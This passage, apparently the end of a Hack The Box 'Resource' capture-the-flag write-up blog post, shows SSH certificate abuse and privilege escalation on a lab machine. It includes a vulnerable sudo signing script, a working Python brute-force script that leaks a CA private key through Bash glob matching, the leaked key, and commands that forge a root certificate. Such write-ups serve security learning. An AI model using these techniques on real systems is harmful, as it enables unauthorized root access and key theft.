AAAAHHNzaC1yc2EtY2VydC12MDFAb3BlbnNzaC5jb20AAAAgjDYLYSfo0Wml9HYiiwIhwvBMqf15sOVvrilWH+ymMikAAAADAQABAAABAQCzy73EB1FRN+0qahalGNh2dvhcNIJuXeUV7ETqcnujYY5HcKq84aZoh2VdzpPwEnd/gu9wYnYrg5k9R+wbt84qFLM5Q0oBFZA6iquq3rI7jw5fBIVLHMVRl1Jl5EHz+Lx7oabGgjAT8xNwbGaMuSLMfgJlyRI6NKyFolsWOasXBHJpjtkMqVrSPrX/yI6Y9jE5WzrihV426Txy+EiH79QE/JiYjAeV0ViB6limHEiNLcOR7phwCc7Qnu+/j9+2GABfjGcutH7dk35EzY2nMD3iUAzYejSif1/HiPXuiuG+9ufDXrIEHVKVni0XLMR5E8vplx7ZSQmy4ZJJdah+6MT3AAAAAAAAACkAAAABAAAAB3p6aW50ZXIAAAAQAAAADHp6aW50ZXJfdGVtcAAAAABnN7gh//////////8AAAAAAAAAggAAABVwZXJtaXQtWDExLWZvcndhcmRpbmcAAAAAAAAAF3Blcm1pdC1hZ2VudC1mb3J3YXJkaW5nAAAAAAAAABZwZXJtaXQtcG9ydC1mb3J3YXJkaW5nAAAAAAAAAApwZXJtaXQtcHR5AAAAAAAAAA5wZXJtaXQtdXNlci1yYwAAAAAAAAAAAAAAMwAAAAtzc2gtZWQyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQAAAFMAAAALc3NoLWVkMjU1MTkAAABAJizu9Jxi1UNIiepI9Y19OnUAdXjWLnXz3eaRhPK71LHjp+FFKxALL5tiT2QiYbRO5mTqethohM4cNsaTnHgPAg== kujen@kujen</span><br><span class="line">support@ssg:~$ <span class="built_in">exit</span></span><br><span class="line"><span class="built_in">logout</span></span><br><span class="line">Connection to ssg.htb closed.</span><br><span class="line">kujen@kujen:~$ nano zzinter-certificate.pub</span><br><span class="line">kujen@kujen:~$ ssh -o CertificateFile=zzinter-certificate.pub -i key zzinter@ssg.htb -p 2222</span><br><span class="line">Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-117-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/pro</span><br><span class="line"></span><br><span class="line"> System information as of Fri Nov 22 09:08:14 PM UTC 2024</span><br><span class="line"></span><br><span class="line">  System load:           0.11</span><br><span class="line">  Usage of /:            78.0% of 10.73GB</span><br><span class="line">  Memory usage:          16%</span><br><span class="line">  Swap usage:            0%</span><br><span class="line">  Processes:             248</span><br><span class="line">  Users logged <span class="keyword">in</span>:       0</span><br><span class="line">  IPv4 address <span class="keyword">for</span> eth0: 10.129.231.118</span><br><span class="line">  IPv6 address <span class="keyword">for</span> eth0: dead:beef::250:56ff:feb9:7353</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Expanded Security Maintenance <span class="keyword">for</span> Applications is not enabled.</span><br><span class="line"></span><br><span class="line">0 updates can be applied immediately.</span><br><span class="line"></span><br><span class="line">Enable ESM Apps to receive additional future security updates.</span><br><span class="line">See https://ubuntu.com/esm or run: sudo pro status</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The list of available updates is more than a week old.</span><br><span class="line">To check <span class="keyword">for</span> new updates run: sudo apt update</span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">zzinter@ssg:~$ <span class="built_in">id</span></span><br><span class="line">uid=1001(zzinter) gid=1001(zzinter) <span class="built_in">groups</span>=1001(zzinter)</span><br><span class="line">zzinter@ssg:~$</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Privilege-Escalation-to-root-SSG"><a href="#Privilege-Escalation-to-root-SSG" class="headerlink" title="Privilege Escalation to root - SSG"></a>Privilege Escalation to root - SSG</h3><p>Checking what zzinter can perform as sudo :</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">zzinter@ssg:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> zzinter on ssg:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User zzinter may run the following commands on ssg:</span><br><span class="line">    (root) NOPASSWD: /opt/sign_key.sh</span><br></pre></td></tr></table></figure></div>
+<p>We check the contents of this file:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">usage</span></span> () &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$0</span> &lt;ca_file&gt; &lt;public_key_file&gt; &lt;username&gt; &lt;principal&gt; &lt;serial&gt;&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$#</span>&quot;</span> -ne 5 ]; <span class="keyword">then</span></span><br><span class="line">    usage</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">ca_file=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">public_key_file=<span class="string">&quot;<span class="variable">$2</span>&quot;</span></span><br><span class="line">username=<span class="string">&quot;<span class="variable">$3</span>&quot;</span></span><br><span class="line">principal_str=<span class="string">&quot;<span class="variable">$4</span>&quot;</span></span><br><span class="line">serial=<span class="string">&quot;<span class="variable">$5</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ ! -f <span class="string">&quot;<span class="variable">$ca_file</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Error: CA file &#x27;<span class="variable">$ca_file</span>&#x27; not found.&quot;</span></span><br><span class="line">    usage</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">itca=$(<span class="built_in">cat</span> /etc/ssh/ca-it)</span><br><span class="line">ca=$(<span class="built_in">cat</span> <span class="string">&quot;<span class="variable">$ca_file</span>&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$itca</span> == <span class="variable">$ca</span> ]]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Error: Use API for signing with this CA.&quot;</span></span><br><span class="line">    usage</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ ! -f <span class="string">&quot;<span class="variable">$public_key_file</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Error: Public key file &#x27;<span class="variable">$public_key_file</span>&#x27; not found.&quot;</span></span><br><span class="line">    usage</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">supported_principals=<span class="string">&quot;webserver,analytics,support,security&quot;</span></span><br><span class="line">IFS=<span class="string">&#x27;,&#x27;</span> <span class="built_in">read</span> -ra principal &lt;&lt;&lt; <span class="string">&quot;<span class="variable">$principal_str</span>&quot;</span></span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;principal[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">if</span> ! <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$supported_principals</span>&quot;</span> | grep -qw <span class="string">&quot;<span class="variable">$word</span>&quot;</span>; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Error: &#x27;<span class="variable">$word</span>&#x27; is not a supported principal.&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Choose from:&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;    webserver - external web servers - webadmin user&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;    analytics - analytics team databases - analytics user&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;    support - IT support server - support user&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;    security - SOC servers - support user&quot;</span></span><br><span class="line">        <span class="built_in">echo</span></span><br><span class="line">        usage</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ! [[ <span class="variable">$serial</span> =~ ^[0-9]+$ ]]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Error: &#x27;<span class="variable">$serial</span>&#x27; is not a number.&quot;</span></span><br><span class="line">    usage</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">ssh-keygen -s <span class="string">&quot;<span class="variable">$ca_file</span>&quot;</span> -z <span class="string">&quot;<span class="variable">$serial</span>&quot;</span> -I <span class="string">&quot;<span class="variable">$username</span>&quot;</span> -V -1w:forever -n <span class="string">&quot;<span class="variable">$principal</span>&quot;</span> <span class="string">&quot;<span class="variable">$public_key_file</span>&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>This script allows us to sign a public key with the CA.<br>1- Usage check: Ensures exactly five arguments are passed: CA file, public key file, username, principal(s), and serial number.<br>2- File validation: Checks if the specified CA file and public key file exist.<br>3- Restricted CA: Prevents using a specific CA (&#x2F;etc&#x2F;ssh&#x2F;ca-it) for signing, requiring an API instead.<br>4- Principal validation: Verifies the provided principal(s) against supported roles (webserver, analytics, support, security).<br>5- Serial validation: Ensures the serial is a numeric value.<br>6- Key signing: Uses ssh-keygen to sign the public key with the CA.</p>
+<p>This script is vulnerable to  <a class="link"   target="_blank" rel="noopener" href="https://oxasploits.com/posts/bash-wildcard-expansion-arbitrary-command-line-arguments-0day/" >Bash Globbing <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>: it is comparing the <code>ca-it</code> key to our provided CA file to the one inside <code>/etc/ssh</code> therefore we can leak the original key by simply bruteforcing it adding the wildcard <code>*</code> at the end:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> <span class="string">&quot;-&quot;</span> + string.ascii_letters + string.digits + <span class="string">&quot;/+\n =&quot;</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/home/zzinter/file&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(leak + char + <span class="string">&quot;*&quot;</span>)</span><br><span class="line">        res = subprocess.run([<span class="string">&quot;sudo&quot;</span>, <span class="string">&quot;/opt/sign_key.sh&quot;</span>, <span class="string">&quot;/home/zzinter/file&quot;</span>, <span class="string">&quot;/etc/passwd&quot;</span>, <span class="string">&quot;kujen&quot;</span>, <span class="string">&quot;kujen&quot;</span>, <span class="string">&quot;1&quot;</span>], stdout=subprocess.PIPE, stderr=subprocess.PIPE)     </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Error: Use API for signing with this CA.&quot;</span> <span class="keyword">in</span> res.stdout.decode():</span><br><span class="line">            leak += char</span><br><span class="line">            <span class="built_in">print</span>(char, end=<span class="string">&quot;&quot;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>Now since we leaked the <code>ca-it</code>, we can use it to sign a new keypair for root user:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">zzinter@ssg:~$ python3 exploit.py</span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW</span><br><span class="line">QyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQAAAKg7BlysOwZc</span><br><span class="line">rAAAAAtzc2gtZWQyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQ</span><br><span class="line">AAAEBexnpzDJyYdz+91UG3dVfjT/scyWdzgaXlgx75RjYOo4Hg8Cudy1ShyYfqzC3ANlgA</span><br><span class="line">cW7Q4MoZuezAE8mNFSmxAAAAIkdsb2JhbCBTU0cgU1NIIENlcnRmaWNpYXRlIGZyb20gSV</span><br><span class="line">QBAgM=</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure></div>
+
+<p>And now connect to our root user and claim the root flag:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">zzinter@ssg:~$ ssh-keygen -t rsa -b 2048 -f root</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase):</span><br><span class="line">Enter same passphrase again:</span><br><span class="line">Your identification has been saved <span class="keyword">in</span> root</span><br><span class="line">Your public key has been saved <span class="keyword">in</span> root.pub</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:EZukaJMt5yB2o2q8Cc5uqwM2sAToLzwNpYkWto/Dpic zzinter@ssg</span><br><span class="line">The key<span class="string">&#x27;s randomart image is:</span></span><br><span class="line"><span class="string">+---[RSA 2048]----+</span></span><br><span class="line"><span class="string">|.       o        |</span></span><br><span class="line"><span class="string">|oo . + o +       |</span></span><br><span class="line"><span class="string">|= O X + +        |</span></span><br><span class="line"><span class="string">|oX = B   .       |</span></span><br><span class="line"><span class="string">|*.B   . S        |</span></span><br><span class="line"><span class="string">|+% +             |</span></span><br><span class="line"><span class="string">|Bo=              |</span></span><br><span class="line"><span class="string">|E.+              |</span></span><br><span class="line"><span class="string">|=@.              |</span></span><br><span class="line"><span class="string">+----[SHA256]-----+</span></span><br><span class="line"><span class="string">zzinter@ssg:~$</span></span><br><span class="line"><span class="string">zzinter@ssg:~$ ls</span></span><br><span class="line"><span class="string">ca-it    exploit.py  kujen           kujen.pub  root.pub</span></span><br><span class="line"><span class="string">ca-test  file        kujen-cert.pub  root       user.txt</span></span><br><span class="line"><span class="string">zzinter@ssg:~$ ssh-keygen -s ca-it -z 1234 -I root -V -100w:forever -n root_user root.pub</span></span><br><span class="line"><span class="string">Signed user key root-cert.pub: id &quot;root&quot; serial 1234 for root_user valid after 2022-12-24T15:59:38</span></span><br><span class="line"><span class="string">zzinter@ssg:~$ ssh -o CertificateFile=root-cert.pub -i key root@localh</span></span><br><span class="line"><span class="string">ost -p 2222</span></span><br><span class="line"><span class="string">Warning: Identity file key not accessible: No such file or directory.</span></span><br><span class="line"><span class="string">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span></span><br><span class="line"><span class="string">@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @</span></span><br><span class="line"><span class="string">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span></span><br><span class="line"><span class="string">Permissions 0644 for &#x27;</span>root-cert.pub<span class="string">&#x27; are too open.</span></span><br><span class="line"><span class="string">It is required that your private key files are NOT accessible by others.</span></span><br><span class="line"><span class="string">This private key will be ignored.</span></span><br><span class="line"><span class="string">Load key &quot;root-cert.pub&quot;: bad permissions</span></span><br><span class="line"><span class="string">root@localhost&#x27;</span>s password:</span><br><span class="line"></span><br><span class="line">zzinter@ssg:~$ <span class="built_in">chmod</span> 600 root-cert.pub</span><br><span class="line">zzinter@ssg:~$ ssh -o CertificateFile=root-cert.pub -i key root@localhost -p 2222</span><br><span class="line">Warning: Identity file key not accessible: No such file or directory.</span><br><span class="line">Load key <span class="string">&quot;root-cert.pub&quot;</span>: error <span class="keyword">in</span> libcrypto</span><br><span class="line">root@localhost<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">zzinter@ssg:~$ ssh -o CertificateFile=root-cert.pub -i root root@local</span></span><br><span class="line"><span class="string">host -p 2222</span></span><br><span class="line"><span class="string">Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-117-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/pro</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> System information as of Sat Nov 23 04:00:48 PM UTC 2024</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System load:           0.01</span></span><br><span class="line"><span class="string">  Usage of /:            90.5% of 10.73GB</span></span><br><span class="line"><span class="string">  Memory usage:          18%</span></span><br><span class="line"><span class="string">  Swap usage:            0%</span></span><br><span class="line"><span class="string">  Processes:             250</span></span><br><span class="line"><span class="string">  Users logged in:       1</span></span><br><span class="line"><span class="string">  IPv4 address for eth0: 10.129.231.118</span></span><br><span class="line"><span class="string">  IPv6 address for eth0: dead:beef::250:56ff:feb9:7353</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  =&gt; / is using 90.5% of 10.73GB</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Expanded Security Maintenance for Applications is not enabled.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0 updates can be applied immediately.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Enable ESM Apps to receive additional future security updates.</span></span><br><span class="line"><span class="string">See https://ubuntu.com/esm or run: sudo pro status</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The list of available updates is more than a week old.</span></span><br><span class="line"><span class="string">To check for new updates run: sudo apt update</span></span><br><span class="line"><span class="string">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@ssg:~# id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line"><span class="string">root@ssg:~# cat root.txt</span></span><br><span class="line"><span class="string">0fc6044116c5ff******************</span></span><br><span class="line"><span class="string">root@ssg:~#</span></span><br></pre></td></tr></table></figure></div>
+
+<p>That was it for Resource! Hope you liked it.<br>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: Resource</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2024-11-22 15:55:55</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-11-23 17:01:53
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2024/11/22/Hackthebox-Resource/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/11/15/Hackthebox-Axlle/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: Axlle</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: Resource</div>
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-Application-http-itrc-ssg-htb"><span class="nav-text">Web Application - http:&#x2F;&#x2F;itrc.ssg.htb </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Shell-as-msainristil"><span class="nav-text">Shell as msainristil</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pivoting-to-root-ITRC"><span class="nav-text">Pivoting to root - ITRC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pivoting-to-Support-SSG"><span class="nav-text">Pivoting to Support - SSG</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pivoting-to-zzinter-SSG"><span class="nav-text">Pivoting to zzinter - SSG</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-Escalation-to-root-SSG"><span class="nav-text">Privilege Escalation to root - SSG</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
